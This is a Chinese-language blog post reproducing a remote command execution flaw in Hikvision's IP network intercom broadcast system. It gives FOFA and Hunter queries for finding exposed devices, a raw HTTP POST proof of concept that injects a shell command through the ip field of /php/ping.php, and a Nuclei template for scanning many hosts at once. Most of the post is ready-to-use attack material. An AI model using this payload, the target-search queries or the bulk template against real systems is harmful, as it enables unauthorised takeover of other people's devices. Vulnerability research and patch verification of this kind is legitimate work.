# 原创
：  漏洞复现--海康威视IP网络对讲广播系统远程命令执行

# 漏洞复现--海康威视IP网络对讲广播系统远程命令执行

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：漏洞描述

海康威视网络对讲广播系统是海康威视提供的安防解决方案的一部分，用于管理和实现对讲和广播功能。该产品存在远程命令执行漏洞，攻击者可通过此漏洞获取服务器权限。

### 二：漏洞影响版本

IP网络对讲广播系统

### 三：网络空间测绘查询

fofa<br/> `icon_hash="-1830859634"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/8b446fce92fb9968477826842b07a8e6.jpeg"/><br/> hunter<br/> `web.icon=="e854b2eaa9e4685a95d8052d5e3165bc"`

### 四：漏洞复现

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/15bef5344678f41c74f3498874c82161.jpeg"/><br/> poc:

```
POST /php/ping.php HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Content-Length: 46
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest

jsondata%5Btype%5D=123&amp;jsondata%5Bip%5D=whoami

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/a6161e73be55bbf7fb470153b0408448.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/13446596b1ec8ff62661d429445a6066.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/7eb282066ce99c07d8d08989ae176e1b.jpeg"/>

### 批量检测

```
id: Hikvision-network-intercom-broadcasting-system-RCE

info:
  name: Hikvision-network-intercom-broadcasting-system-RCE
  author: 芝士土拨鼠
  severity: high

requests:
  - raw:
      - |-
        POST /php/ping.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
        Content-Length: 46
        Accept: application/json, text/javascript, */*; q=0.01
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        X-Requested-With: XMLHttpRequest

        jsondata%5Btype%5D=123&amp;jsondata%5Bip%5D=whoami

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - administrator
          - root
      - type: status
        status:
          - 200

```
